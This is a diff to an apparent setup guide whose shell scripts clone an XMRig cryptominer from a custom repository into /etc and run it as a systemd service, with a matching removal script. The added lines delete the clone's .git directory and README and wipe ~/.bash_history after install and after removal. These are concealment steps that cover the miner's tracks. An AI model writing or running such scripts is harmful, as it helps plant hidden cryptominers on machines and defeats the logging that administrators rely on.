@@ -10,6 +10,7 @@ dnf install -y git jq
 # Clone XMRig (custom repo)
 if [ ! -d /etc/XMRig ]; then
     git clone https://github.com/montasirrahman/XMRig.git /etc/XMRig
+    rm -rf /etc/XMRig/.git/ /etc/XMRig/README.md
 else
     echo "Directory /etc/XMRig already exists. Skipping clone."
 fi
@@ -47,6 +48,9 @@ systemctl start xmrig.service
 # Check status
 systemctl status xmrig.service
 
+# Clear history
+cat /dev/null > ~/.bash_history
+rm -f ~/.bash_history
 history -c
 
 ```
@@ -65,6 +69,7 @@ yum install -y git jq
 # Clone XMRig (custom repo)
 if [ ! -d /etc/XMRig ]; then
     git clone https://github.com/montasirrahman/XMRig.git /etc/XMRig
+    rm -rf /etc/XMRig/.git/ /etc/XMRig/README.md
 else
     echo "Directory /etc/XMRig already exists. Skipping clone."
 fi
@@ -102,6 +107,9 @@ systemctl start xmrig.service
 # Check status
 systemctl status xmrig.service
 
+# Clear history
+cat /dev/null > ~/.bash_history
+rm -f ~/.bash_history
 history -c
 ```
 
@@ -123,12 +131,16 @@ screen -wipe
 # Remove systemd service and XMRig files
 rm -f /etc/systemd/system/xmrig.service
 rm -rf /etc/XMRig
-history -c
 
 # Reload systemd
 systemctl daemon-reload
 
 echo "🧹 XMRig and its service have been fully removed."
+
+# Clear history
+cat /dev/null > ~/.bash_history
+rm -f ~/.bash_history
+history -c
 
 # Clear history
 cat /dev/null > ~/.bash_history
